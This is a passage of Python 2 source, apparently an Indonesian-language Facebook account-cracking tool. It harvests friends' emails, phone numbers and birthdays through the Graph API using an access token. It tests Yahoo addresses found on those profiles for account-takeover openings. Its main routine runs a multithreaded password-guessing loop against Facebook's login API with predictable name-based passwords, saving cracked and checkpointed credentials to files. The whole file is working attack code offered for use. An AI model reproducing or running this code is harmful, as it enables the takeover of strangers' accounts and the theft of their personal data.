	print '\033[1;97m[\033[1;96m✓\033[1;97m] \033[1;97mFinish ....'
	print"\033[1;97m[\033[1;96m+\033[1;97m] \033[1;97mTotal \033[1;92mOK\033[1;97m/\x1b[1;91mCP \033[1;97m: \033[1;92m"+str(len(oks))+"\033[1;97m/\033[1;91m"+str(len(cekpoint))
	print("\033[1;97m[\033[1;96m!\033[1;97m] \033[1;97mCP file Saved : out/world.txt")
	print "\033[1;92m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
	raw_input("\033[1;93m[\033[1;97m Back \033[1;93m]")
	os.system("python2 cek.py")

####INFORMASI####
def informasi():
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		keluar()
	os.system('clear')
	print logo
	print 42*"\033[1;96m="
	aid = raw_input('\033[1;96m[+] \033[1;93mMasukan ID/Nama\033[1;91m : \033[1;97m')
	jalan('\033[1;96m[✺] \033[1;93mTunggu sebentar \033[1;97m...')
	r = requests.get('https://graph.facebook.com/me/friends?access_token='+toket)
	cok = json.loads(r.text)
	for i in cok['data']:
		if aid in i['name'] or aid in i['id']:
			x = requests.get("https://graph.facebook.com/"+i['id']+"?access_token="+toket)
			z = json.loads(x.text)
			print 43*"\033[1;96m="
			try:
				print '\033[1;96m[➹] \033[1;93mNama\033[1;97m          : '+z['name']
			except KeyError: print '\033[1;96m[?] \033[1;93mNama\033[1;97m          : \033[1;91mTidak ada'
			try:
				print '\033[1;96m[➹] \033[1;93mID\033[1;97m            : '+z['id']
			except KeyError: print '\033[1;96m[?] \033[1;93mID\033[1;97m            : \033[1;91mTidak ada'
			try:
				print '\033[1;96m[➹] \033[1;93mEmail\033[1;97m         : '+z['email']
			except KeyError: print '\033[1;96m[?] \033[1;93mEmail\033[1;97m         : \033[1;91mTidak ada'
			try:
				print '\033[1;96m[➹] \033[1;93mNo HP\033[1;97m         : '+z['mobile_phone']
			except KeyError: print '\033[1;96m[?] \033[1;93mNo HP\033[1;97m         : \033[1;91mTidak ada'
			try:
				print '\033[1;96m[➹] \033[1;93mTempat tinggal\033[1;97m: '+z['location']['name']
			except KeyError: print '\033[1;96m[?] \033[1;93mTempat tinggal\033[1;97m: \033[1;91mTidak ada'
			try:
				print '\033[1;96m[➹] \033[1;93mTanggal lahir\033[1;97m : '+z['birthday']
			except KeyError: print '\033[1;96m[?] \033[1;93mTanggal lahir\033[1;97m : \033[1;91mTidak ada'
			try:
				print '\033[1;96m[➹] \033[1;93mSekolah\033[1;97m       : '
				for q in z['education']:
					try:
						print '\033[1;91m                   ~ \033[1;97m'+q['school']['name']
					except KeyError: print '\033[1;91m                   ~ \033[1;91mTidak ada'
			except KeyError: pass
			raw_input("\n\033[1;96m[\033[1;97mKembali\033[1;96m]")
			menu()
		else:
			pass
	else:
		print"\033[1;96m[✖] \x1b[1;91mAkun tidak ditemukan"
		raw_input("\n\033[1;96m[\033[1;97mKembali\033[1;96m]")
		menu_yahoo()

##### YAHOO CLONE #####
def menu_yahoo():
	global toket
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(0.01)
		login()
	os.system("clear")
	print logo
	print "\033[1;92m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
	print "\033[1;97m[\033[1;92m01\033[1;97m]\033[1;96m->\033[1;97m Clone From Friendlist"
	print "\033[1;97m[\033[1;92m02\033[1;97m]\033[1;96m->\033[1;97m Clone From Public/Friends"
	print "\033[1;97m[\033[1;91m00\033[1;97m]\033[1;96m->\033[1;97m Back"
	print "\033[1;92m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
	yahoo_pilih()

#### PILIH YAHOO ####
def yahoo_pilih():
	go = raw_input("\033[1;93m︻デ═一▸ \033[91m:\033[1;92m ")
	if go =="":
		print"\033[1;97m[\033[1;91m!\033[1;97m]\033[1;97m Fill In Correctly !"
		yahoo_pilih()
	elif go =="1" or go =="01":
		yahoofriends()
	elif go =="2" or go =="02":
		yahoofromfriends()
	elif go =="0" or go =="00":
		menu()
	else:
		print"\033[1;97m[\033[1;91m!\033[1;97m]\033[1;97m Fill In Correctly !"
		yahoo_pilih() 
		
##### LIST FRIEND #####
def yahoofriends():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(0.01)
		login()
	try:
		os.mkdir('out')
	except OSError:
		pass
	os.system('clear')
	print logo
	mpsh = []
	jml = 0
	print "\033[1;92m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
	jalan('\033[1;97m[\033[1;92m~\033[1;97m] Take email ...')
	teman = requests.get('https://graph.facebook.com/me/friends?access_token='+toket)
	kimak = json.loads(teman.text)
	save = open('out/mailku.txt','w')
	jalan('\033[1;97m[\033[1;92m•\033[1;97m] Start clone ...')
	print "\033[1;92m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
	for w in kimak['data']:
		jml +=1
		mpsh.append(jml)
		id = w['id']
		nama = w['name']
		links = requests.get("https://graph.facebook.com/"+id+"?access_token="+toket)
		z = json.loads(links.text)
		try:
			mail = z['email']
			yahoo = re.compile(r'@.*')
			otw = yahoo.search(mail).group()
			if 'yahoo.com' in otw:
				br.open("https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com")
				br._factory.is_html = True
				br.select_form(nr=0)
				br["username"] = mail
				klik = br.submit().read()
				jok = re.compile(r'"messages.ERROR_INVALID_USERNAME">.*')
				try:
					pek = jok.search(klik).group()
				except:
					continue
				if '"messages.ERROR_INVALID_USERNAME">' in pek:
					save.write(mail + '\n')
					print("\033[1;97m[ \033[1;92mVULN✓\033[1;97m ] \033[1;92m" +mail+" \033[1;97m=>"+nama)
					berhasil.append(mail)
		except KeyError:
			pass
	print '\033[1;97m[\033[1;92m✓\033[1;97m] Finish ...'
	print"\033[1;97m[\033[1;92m+\033[1;97m] Total : "+str(len(Succes))
	print"\033[1;97m[\033[1;92m•\033[1;97m] File tersimpan : out/mailku.txt"
	save.close()
	raw_input("\n\033[1;93m[ \033[1;97mBack \033[1;93m]")
	os.system("python2 xd.py")

##### CLONE FROM PUBLIK #####
def yahoofromfriends():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(0.01)
		login()
	try:
		os.mkdir('out')
	except OSError,requests.exceptions.ConnectionError:
		pass
	os.system('clear')
	print logo
	mpsh = []
	jml = 0
	print "\033[1;92m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
	idt = raw_input("\033[1;97m[\033[1;92m+\033[1;97m] ID Public/Friends : ")
	try:
		jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
		op = json.loads(jok.text)
		print"\033[1;97m[\033[1;92m✓\033[1;97m] Nama : "+op["name"]
	except KeyError:
		print"\033[1;91m[!] ID Public/Friends Nothing"
		raw_input("\n\033[1;93m[ \033[1;97mBack \033[1;93m]")
		menu_yahoo()
	jalan('\033[1;97m[\033[1;92m~\033[1;97m] Take email ...')
	teman = requests.get('https://graph.facebook.com/'+idt+'/friends?access_token='+toket)
	kimak = json.loads(teman.text)
	save = open('out/mailteman.txt','w')
	jalan('\033[1;97m[\033[1;92m•\033[1;97m] Start clone\033[1;97m...')
	print "\033[1;92m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
	for w in kimak['data']:
		jml +=1
		mpsh.append(jml)
		id = w['id']
		nama = w['name']
		links = requests.get("https://graph.facebook.com/"+id+"?access_token="+toket)
		z = json.loads(links.text)
		try:
			mail = z['email']
			yahoo = re.compile(r'@.*')
			otw = yahoo.search(mail).group()
			if 'yahoo.com' in otw:
				br.open("https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com")
				br._factory.is_html = True
				br.select_form(nr=0)
				br["username"] = mail
				klik = br.submit().read()
				jok = re.compile(r'"messages.ERROR_INVALID_USERNAME">.*')
				try:
					pek = jok.search(klik).group()
				except:
					continue
				if '"messages.ERROR_INVALID_USERNAME">' in pek:
					save.write(mail + '\n')
					print("\033[1;97m[ \033[1;92mVULN✓\033[1;97m ] \033[1;92m" +mail+" \033[1;97m=>"+nama)
					Succes.append(mail)
		except KeyError:
			pass
	print '\033[1;97m[\033[1;92m✓\033[1;97m] Finish....'
	print"\033[1;97m[\033[1;92m•\033[1;97m] Total : "+str(len(Succes))
	print"\033[1;97m[\033[1;92m!\033[1;97m] File saved : out/mailteman.txt"
	save.close()
	raw_input("\n\033[1;93m[ \033[1;97mBack \033[1;93m]")
	os.system("python2 cek.py")
	
########## CRACK BANGLADESH #######
def bangla():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;96m[!] \x1b[1;91mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		keluar()
	os.system('clear')
	print logo
	print "\033[1;92m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
	print "\033[1;97m[\033[1;94m01\033[1;97m]\033[1;96m->\033[1;97m Crack dari daftar teman"
	print "\033[1;97m[\033[1;94m02\033[1;97m]\033[1;96m->\033[1;97m Crack dari id publik/teman"
	print "\033[1;97m[\033[1;94m03\033[1;97m]\033[1;96m->\033[1;97m Crack dari file"
	print "\033[1;97m[\033[1;91m00\033[1;97m]\033[1;96m->\033[1;97m Back"
	print "\033[1;92m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
	pilih_bangla()

#### PILIH BANGLA ####
def pilih_bangla():
	reak = raw_input("\033[1;93m︻デ═一▸ \033[91m:\033[1;92m ")
	if reak =="":
		print"\033[1;97m[\033[1;91m!\033[1;97m]\033[1;97m Fill In Correctly !"
		pilih_bangla()
	elif reak =="1" or reak == "01":
		os.system('clear')
		print logo
		print "\033[1;92m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
		z = json.loads(r.text)
		for s in z['data']:
			id.append(s['id'])
	elif reak =="2" or reak == "02":
		os.system('clear')
		print logo
		print "\033[1;92m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
		print " \033[1;94m    ××× \033[1;97mCRACK BANGLADESH/PAKISTAN \033[1;94m××× "
		print "\033[1;92m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
		dok = raw_input("\033[1;97m{\033[1;94m+\033[1;97m} ID publik/teman : ")
		try:
			jok = requests.get("https://graph.facebook.com/"+dok+"?access_token="+toket)
			op = json.loads(jok.text)
			print"\033[1;97m{\033[1;94m✓\033[1;97m} Nama : "+op["name"]
		except KeyError:
			print"\033[1;97m[\033[1;94m!\033[1;97m] ID publik/teman tidak ada !"
			raw_input("\n[ Back ]")
			bangla()
		except requests.exceptions.ConnectionError:
			print"[!] Try Again !"
			keluar()
		r = requests.get("https://graph.facebook.com/"+dok+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif reak =="3" or reak == "03":
		os.system('clear')
		print logo
		try:
			print "\033[1;92m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
			idlist = raw_input('\033[1;97m{\033[1;94m?\033[1;97m} Nama File : ')
			for line in open(idlist,'r').readlines():
				id.append(line.strip())
		except KeyError:
			print '\033[1;97m[!] File tidak ada ! '
			raw_input('\n\033[1;92m[ \033[1;97mBack \033[1;92m]')
		except IOError:
			print '\033[1;97m[!] File tidak ada !'
			raw_input('\n\033[1;93m[ \033[1;97mBack \033[1;93m]')
			bangla()
	elif reak =="0" or reak == "00":
		menu()
	else:
		print"\033[1;97m[\033[1;91m!\033[1;97m]\033[1;97m Fill In Correctly !"
		pilih_bangla()
	
	print "\033[1;97m{\033[1;94m+\033[1;97m} Total ID : "+str(len(id))
	print('\033[1;97m{\033[1;94m?\033[1;97m} Stop CTRL+Z')
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;97m{\033[1;94m•\033[1;97m} Crack Walk "+o),;sys.stdout.flush();time.sleep(1)
	print "\n\033[1;92m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
	
#####MAIN_BANGLADESH#####
	def main(arg):
		global cpe,oke
		ubd = arg
		try:
			os.mkdir('out')
		except OSError:
			pass
		try:
			a = requests.get('https://graph.facebook.com/'+ubd+'/?access_token='+toket)
			x = json.loads(a.text)
			bos1 = x['first_name']+'123'
			data1 = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(ubd)+"&locale=en_US&password="+(bos1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			naga1 = json.load(data1)
			if 'access_token' in naga1:
				print '\033[1;92m[Succes] ' +ubd+' ❂ '+bos1
				oke.append(ubd+bos1)
			else:
				if 'www.facebook.com' in naga1['error_msg']:
					print '\033[1;94m[Checkpoint ×] ' +ubd+' ❂ '+bos1
					cek = open("out/pakisbang.txt", "a")
					cek.write("ID:" +ubd+ " Pw:" +bos1+"\n")
					cek.close()
					cpe.append(ubd+bos1)
				else:
					bos2 = x['first_name']+'1234'
					data2 = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(ubd)+"&locale=en_US&password="+(bos2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					naga2 = json.load(data2)
					if 'access_token' in naga2:
						print '\033[1;92m[Succes] ' +ubd+' ❂ '+bos2
						oke.append(ubd+bos2)
					else:
						if 'www.facebook.com' in naga2['error_msg']:
							print '\033[1;94m[Checkpoint ×] ' +ubd+' ❂ '+bos2
							cek = open("out/pakisbang.txt", "a")
							cek.write("ID:" +ubd+ " Pw:" +bos2+"\n")
							cek.close()
							cpe.append(ubd+bos2)
						else:
							bos3 = x['first_name']+'12345'
							data3 = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(ubd)+"&locale=en_US&password="+(bos3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							naga3 = json.load(data3)
							if 'access_token' in naga3:
								print '\033[1;92m[Succes] ' +ubd+' ❂ '+bos3
								oke.append(ubd+bos3)
							else:
								if 'www.facebook.com' in naga3['error_msg']:
									print '\033[1;94m[Checkpoint ×] ' +ubd+' ❂ '+bos3
									cek = open("out/pakisbang.txt", "a")
									cek.write("ID:" +ubd+ " Pw:" +bos3+"\n")
									cek.close()
									cpe.append(ubd+bos3)
								else:
									bos4 = '786786'
									data4 = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(ubd)+"&locale=en_US&password="+(bos4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									naga4 = json.load(data4)
									if 'access_token' in naga4:
										print '\033[1;92m[Succes] ' +ubd+' ❂ '+bos4
										oke.append(ubd+bos4)
									else:
										if 'www.facebook.com' in naga4['error_msg']:
											print '\033[1;94m[Cekpoint] ' +ubd+' ❂ '+bos4
											cek = open("out/pakisbang.txt", "a")
											cek.write("ID:" +ubd+ " Pw:" +bos4+"\n")
											cek.close()
											cpe.append(ubd+bos4)
										else:
											bos5 = x['first_name']+'786'
											data5 = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(ubd)+"&locale=en_US&password="+(bos5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											naga5 = json.load(data5)
											if 'access_token' in naga5:
												print '\033[1;92m[Succes] '+ubd+' ❂ '+bos5
												oke.append(ubd+bos5)
											else:
												if 'www.facebook.com' in naga5['error_msg']:
													print '\033[1;94m[Checkpoint ×] ' +ubd+' ❂ '+bos5
													cek = open("out/pakisbang.txt", "a")
													cek.write("ID:" +ubd+ " Pw:" +bos5+"\n")
													cek.close()
													cpe.append(ubd+bos5)
												else:
													bos6 = x['last_name']+'123'
													data6 = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(ubd)+"&locale=en_US&password="+(bos6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
													naga6 = json.load(data6)
													if 'access_token' in naga6:
														print '\033[1;92m[Succes] ' +ubd+' ❂ '+bos6
														oke.append(ubd+bos6)
													else:
														if 'www.facebook.com' in naga6['error_msg']:
															print '\033[1;94m[Checkpoint ×] ' +ubd+' ❂ '+bos6
															cek = open("out/pakisbang.txt", "a")
															cek.write("ID:" +ubd+ " Pw:" +bos6+"\n")
															cek.close()
															cpe.append(ubd+bos6)
														else:
															bos7 = x['last_name']+'1234'
															data7 = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(ubd)+"&locale=en_US&password="+(bos7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
															naga7 = json.load(data7)
															if 'access_token' in naga7:
																print '\033[1;92m[Succes] ' +ubd+' ❂ '+bos7
																oke.append(ubd+bos7)
															else:
																if 'www.facebook.com' in naga7['error_msg']:
																	print '\033[1;94m[Checkpoint ×] ' +ubd+' ❂ '+bos7
																	cek = open("out/pakisbang.txt", "a")
																	cek.write("ID:" +ubd+ " Pw:" +bos7+"\n")
																	cek.close()
																	cpe.append(ubd+bos7)
																else:
																	bos8 = 'Pakistan'
																	data8 = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(ubd)+"&locale=en_US&password="+(bos8)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
																	naga8 = json.load(data8)
																	if 'access_token' in naga8:
																		print '\033[1;92m[Succes] ' +ubd+' ❂ '+bos8
																		oke.append(ubd+bos8)
																	else:
																		if 'www.facebook.com' in naga8['error_msg']:
																			print '\033[1;94m[Checkpoint ×] ' +ubd+' ❂ ' +bos8
																			cek = open("out/pakisbang.txt", "a")
																			cek.write("ID:" +ubd+ " Pw:" +bos8+"\n")
																			cek.close()
																			cpe.append(ubd+bos8)
																		else:
																			bos9 = x['last_name']+'786'
																			data9 = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(ubd)+"&locale=en_US&password="+(bos9)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
																			naga9 = json.load(data9)
																			if 'access_token' in naga9:
																				print '\033[1;92m[Succes] ' +ubd+' ❂ '+bos9
																				oke.append(ubd+bos9)
																			else:
																				if 'www.facebook.com' in naga9['error_msg']:
																					print '\033[1;94m[Checkpoint ×] ' +ubd+' ❂ ' +bos9
																					cek = open("out/pakisbang.txt", "a")
																					cek.write("ID:" +ubd+ " Pw:" +bos9+"\n")
																					cek.close()
																					cpe.append(ubd+bos9)
		except:
			pass
			
	p = ThreadPool(30)
	p.map(main, id)
	print "\033[1;92m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
	print '\033[1;97m[\033[1;94m✓\033[1;97m] \033[1;97mFinish....'
	print"\033[1;97m[\033[1;94m+\033[1;97m] \033[1;97mTotal \033[1;92mOK\033[1;97m/\x1b[1;94mCP \033[1;97m: \033[1;92m"+str(len(oke))+"\033[1;97m/\033[1;94m"+str(len(cpe))
	print '\033[1;97m[\033[1;94m!\033[1;97m] \033[1;97mCP file saved : out/pakisbang.txt'
	print "\033[1;92m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
	raw_input("\033[1;93m[\033[1;97m Back \033[1;93m]")
	os.system("python2 cek.py")
	
#######SAYA########
def saya():
	os.system ('clear')
	print logo
	jalan ('        \033[92mAnda Akan Di Arahkan Ke Browser')
	os.system('xdg-open https://m.facebook.com/rvadxd.1')
	menu()
       
		
if __name__ == '__main__':
	menu()
	masuk()